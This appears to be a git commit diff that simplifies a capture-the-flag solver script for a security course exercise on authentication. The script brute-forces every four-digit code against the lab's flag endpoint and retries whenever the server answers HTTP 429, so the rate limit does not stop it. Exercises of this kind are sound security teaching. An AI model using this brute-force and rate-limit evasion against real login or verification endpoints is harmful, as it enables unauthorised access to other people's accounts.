4b779973091da6dd2abe5f280c9753cd137632dd
SAW <99191294+nicsaw@users.noreply.github.com>
2025-03-30 02:09:15 +1100

    Simplify quoccaair_frequent_flyer.py

--- ctf/2-Authn-Authz/quoccaair_frequent_flyer.py
+++ ctf/2-Authn-Authz/quoccaair_frequent_flyer.py
@@ -1,52 +1,24 @@
-import requests
-import os
-import re
-import json
+import sys
 from pathlib import Path
+sys.path.append(str(Path(__file__).resolve().parent.parent))
+from utils import get_session, find_flag
 
-session = requests.Session()
-session.cert = os.path.join(os.path.dirname(__file__), "../../z5437741.pem")
+class Solver:
+    def __init__(self):
+        self.session = get_session()
 
-URL = "https://quoccaair-ff.quoccacorp.com/flag"
-FLAG_PATTERN = r"(COMP6443{.+?})"
-RESULTS_FILENAME = "quoccaair_frequent_flyer.json"
-INCORRECT_CODE_MSG = "Sorry, that code is not correct."
-TOO_MANY_REQUESTS_MSG = "Too Many Requests"
+    def req(self, code: str):
+        POST_URL = "https://quoccaair-ff.quoccacorp.com/flag"
+        while True:
+            response = self.session.post(POST_URL, data={"code": code})
+            if response.status_code != 429:
+                return response
 
-if Path(RESULTS_FILENAME).exists():
-    with open(RESULTS_FILENAME, "r") as f:
-        results = json.load(f)
-else:
-    results = {}
-
-def find_flag(text: str):
-    if flag_match := re.search(FLAG_PATTERN, text):
-        flag = flag_match.group(1)
-        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
-        exit()
-
-def main():
-    try:
+    def main(self):
         for i in range(10000):
             code = f"{i:04}"
-            if code in results and results[code] == INCORRECT_CODE_MSG:
-                print(f"Skipping {code = }")
-                continue
-
-            print(f"{code = }")
-            response = session.post(URL, data={"code": code})
-            response_text = response.content.decode("utf-8", "ignore")
-            find_flag(response_text)
-
-            if INCORRECT_CODE_MSG in response_text:
-                results[code] = INCORRECT_CODE_MSG
-            elif TOO_MANY_REQUESTS_MSG in response_text:
-                results[code] = TOO_MANY_REQUESTS_MSG
-    except Exception as e:
-        print(e)
-    finally:
-        with open(RESULTS_FILENAME, "w") as f:
-            json.dump(results, f, indent=4)
+            response = self.req(code)
+            if find_flag(response.text): break
 
 if __name__ == "__main__":
-    main()
+    Solver().main()
